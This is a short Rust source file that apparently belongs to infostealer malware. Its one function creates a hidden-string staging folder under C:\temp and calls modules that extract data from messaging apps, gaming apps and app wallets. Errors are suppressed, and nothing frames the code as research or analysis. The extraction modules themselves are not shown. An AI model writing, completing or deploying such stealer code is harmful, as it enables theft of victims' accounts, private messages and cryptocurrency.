use crate::sprotect;
use std::fs;
use std::process::Command;

pub async fn extract_all_apps() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\apps");
    fs::create_dir_all(&output_dir)?;
    
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
    }
    
    crate::app::messaging::extract_messaging_apps().await.ok();
    crate::app::gaming::extract_gaming_apps().await.ok();
    crate::app::app_wallets::extract_app_wallets().await.ok();
    
    Ok(())
}